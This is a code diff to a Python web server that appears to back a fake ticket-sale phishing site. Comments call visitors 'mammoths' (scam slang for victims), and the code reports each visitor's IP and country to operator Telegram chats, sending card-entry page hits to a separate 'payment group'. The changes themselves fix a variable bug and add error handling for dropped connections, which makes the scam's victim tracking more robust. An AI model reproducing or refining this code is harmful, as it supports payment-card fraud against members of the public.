@@ -208,8 +208,9 @@ def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, im
     def send_log():
         try:
             # Отримуємо країну якщо не передана
-            if not country:
-                country = get_country_by_ip(ip)
+            current_country = country
+            if not current_country:
+                current_country = get_country_by_ip(ip)
             
             # Формуємо повідомлення
             if extra_user_id:
@@ -218,7 +219,7 @@ def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, im
                     f"📄 Сторінка: {page}\n"
                     f"🔗 Посилання: {link}\n"
                     f"🌍 IP: {ip}\n"
-                    f"🏳️ Країна: {country}\n"
+                    f"🏳️ Країна: {current_country}\n"
                     f"👤 Event Creator ID: {extra_user_id}"
                 )
                 # Надсилаємо event creator
@@ -233,7 +234,7 @@ def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, im
                         f"🚨 Важлива дія\n"
                         f"📄 Сторінка: {page}\n"
                         f"🌍 IP: {ip}\n"
-                        f"🏳️ Країна: {country}"
+                        f"🏳️ Країна: {current_country}"
                     )
                     send_telegram_message_to_group(message)
                     
@@ -401,13 +402,14 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     print(f"[DEBUG] send_telegram_log called with: page={page}, link={link}, ip={ip}, country='{country}'")
     
     # Якщо країна не передана, використовуємо "Unknown"
-    if not country:
-        country = "Unknown"
-        print(f"[DEBUG] No country provided, using: {country}")
+    current_country = country
+    if not current_country:
+        current_country = "Unknown"
+        print(f"[DEBUG] No country provided, using: {current_country}")
     
     # Перетворюємо код країни на повну назву (якщо це код)
-    country_full = COUNTRY_NAMES.get(country, country)
-    print(f"[DEBUG] Final country: '{country}' -> '{country_full}'")
+    country_full = COUNTRY_NAMES.get(current_country, current_country)
+    print(f"[DEBUG] Final country: '{current_country}' -> '{country_full}'")
     
     # Визначаємо назву сторінки
     page_name = get_page_name(page)
@@ -447,32 +449,42 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
             except Exception as e:
                 print(f"❌ Помилка надсилання event creator {extra_user_id}: {e}")
         else:
-            # Звичайне логування для адміністраторів
+                        # Звичайне логування для адміністраторів
             if important:
-                requests.post(url, data=data_group, timeout=1)
-                
-                # Спеціальне логування в платіжну групу для сторінки введення карти
-                if page == "Ввод карты" or "/buy-tickets/loading/" in link:
-                    try:
-                        data_payment_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
-                        requests.post(url, data=data_payment_group, timeout=1)
-                        print(f"📤 Лог надіслано в платіжну групу {PAYMENT_GROUP_ID}")
-                    except Exception as e:
-                        print(f"❌ Помилка надсилання в платіжну групу: {e}")
-                # else:
-                #     НЕ надсилаємо лог "Мамонт открыл страницу" в платіжну групу для інших сторінок
-                #     requests.post(url, data=data_group2, timeout=1)
-            requests.post(url, data=data_admin, timeout=1)
+                try:
+                    requests.post(url, data=data_group, timeout=1)
+                    
+                    # Спеціальне логування в платіжну групу для сторінки введення карти
+                    if page == "Ввод карты" or "/buy-tickets/loading/" in link:
+                        try:
+                            data_payment_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}
+                            requests.post(url, data=data_payment_group, timeout=1)
+                            print(f"📤 Лог надіслано в платіжну групу {PAYMENT_GROUP_ID}")
+                        except Exception as e:
+                            print(f"❌ Помилка надсилання в платіжну групу: {e}")
+                    # else:
+                    #     НЕ надсилаємо лог "Мамонт открыл страницу" в платіжну групу для інших сторінок
+                    #     requests.post(url, data=data_group2, timeout=1)
+                except Exception as e:
+                    print(f"❌ Помилка надсилання в групу: {e}")
+            
+            try:
+                requests.post(url, data=data_admin, timeout=1)
+            except Exception as e:
+                print(f"❌ Помилка надсилання головному адміну: {e}")
             
             # Надсилаємо лог всім адміністраторам
-            from config import ADMIN_IDS
-            for admin_id in ADMIN_IDS:
-                if admin_id != ADMIN_ID:  # Не дублюємо головному адміну
-                    try:
-                        data_admin_personal = {"chat_id": admin_id, "text": msg}
-                        requests.post(url, data=data_admin_personal, timeout=1)
-                    except Exception as e:
-                        print(f"❌ Помилка надсилання адміну {admin_id}: {e}")
+            try:
+                from config import ADMIN_IDS
+                for admin_id in ADMIN_IDS:
+                    if admin_id != ADMIN_ID:  # Не дублюємо головному адміну
+                        try:
+                            data_admin_personal = {"chat_id": admin_id, "text": msg}
+                            requests.post(url, data=data_admin_personal, timeout=1)
+                        except Exception as e:
+                            print(f"❌ Помилка надсилання адміну {admin_id}: {e}")
+            except Exception as e:
+                print(f"❌ Помилка надсилання адміністраторам: {e}")
                     
     except Exception as e:
         print(f"❌ Не вдалося надіслати лог у Telegram: {e}")
@@ -1219,6 +1231,14 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             return
         try:
             super().do_GET()
+        except BrokenPipeError:
+            # Клієнт закрив з'єднання - це нормально, не логуємо
+            print(f"[INFO] Client disconnected for {self.path}")
+            return
+        except ConnectionResetError:
+            # Клієнт скинув з'єднання - це нормально, не логуємо
+            print(f"[INFO] Connection reset by client for {self.path}")
+            return
         except Exception as e:
             # Логуємо помилки в Telegram
             try:
@@ -1236,7 +1256,51 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             except:
                 pass
             
-            self.send_error(500, f"Internal Server Error: {e}")
+            try:
+                self.send_error(500, f"Internal Server Error: {e}")
+            except (BrokenPipeError, ConnectionResetError):
+                # Клієнт закрив з'єднання під час відправки помилки
+                print(f"[INFO] Client disconnected while sending error for {self.path}")
+                return
+
+    def send_error(self, code, message=None, explain=None):
+        """Перевизначаємо send_error для кращої обробки помилок"""
+        try:
+            super().send_error(code, message, explain)
+        except (BrokenPipeError, ConnectionResetError):
+            print(f"[INFO] Client disconnected while sending error {code} for {self.path}")
+            return
+        except Exception as e:
+            print(f"[ERROR] Failed to send error {code}: {e}")
+            return
+
+    def safe_send_response(self, code, message=None):
+        """Безпечна відправка відповіді з обробкою помилок з'єднання"""
+        try:
+            self.send_response(code, message)
+            self.end_headers()
+            return True
+        except (BrokenPipeError, ConnectionResetError):
+            print(f"[INFO] Client disconnected while sending response {code} for {self.path}")
+            return False
+        except Exception as e:
+            print(f"[ERROR] Failed to send response {code}: {e}")
+            return False
+
+    def safe_write(self, data):
+        """Безпечний запис даних з обробкою помилок з'єднання"""
+        try:
+            if isinstance(data, str):
+                self.wfile.write(data.encode('utf-8'))
+            else:
+                self.wfile.write(data)
+            return True
+        except (BrokenPipeError, ConnectionResetError):
+            print(f"[INFO] Client disconnected while writing data for {self.path}")
+            return False
+        except Exception as e:
+            print(f"[ERROR] Failed to write data: {e}")
+            return False
 
     def do_OPTIONS(self):
         # Обробка CORS preflight запитів
@@ -1282,9 +1346,16 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 # Відправляємо тіло відповіді
                 self.wfile.write(response.content)
                 return
+            except (BrokenPipeError, ConnectionResetError):
+                print(f"[INFO] Client disconnected during API proxy for {self.path}")
+                return
             except Exception as e:
                 print(f"[API Proxy POST] Error proxying to backend: {e}")
-                self.send_error(502, f"Backend Error: {e}")
+                try:
+                    self.send_error(502, f"Backend Error: {e}")
+                except (BrokenPipeError, ConnectionResetError):
+                    print(f"[INFO] Client disconnected while sending error for {self.path}")
+                    return
                 return
         if path == '/log_visit':
             content_length = int(self.headers.get('Content-Length', 0))
